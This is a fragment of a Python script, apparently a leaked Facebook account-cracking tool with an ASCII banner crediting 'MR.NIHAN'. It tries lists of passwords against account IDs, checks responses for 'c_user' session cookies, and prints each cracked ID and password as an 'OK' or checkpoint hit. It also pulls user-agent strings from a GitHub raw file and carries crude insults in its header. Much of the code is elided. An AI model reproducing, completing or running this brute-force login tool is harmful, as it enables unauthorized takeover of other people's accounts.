#OpenSOURCE BY : LEAKED BY HARIS AND TAJAMMAL
#GITHUB : Harisakhtar0
#Sub munafik Logo ki ab M.c hony wali ha ðŸ™‚
#coding=utf
...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/James404-cyber/binnos/main/.fb_app.txt').text
		ua=open('.bbnew.txt','w')
...
##    ## #### ##     ## ##     ## ##    ## 
\033[1;32m[+]==============================================
\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mMR.NIHAN 
\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mMR.NIHAN 
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mNIHAN -143
\033[1;32m[+] \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS Paid
\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m2.5.1
 If you are harami then everything is possible 
\033[1;32m[+]==============================================      """
loop = 0
oks = []
cps = []
...
os.system("xdg-open https://facebook.com/groups/893149411835087/")
def main():
    os.system('clear')
    print(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;92m[NIHAN -OK] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[NIHAN -CP] '+cid+' | '+ps+'\033[0;97m')
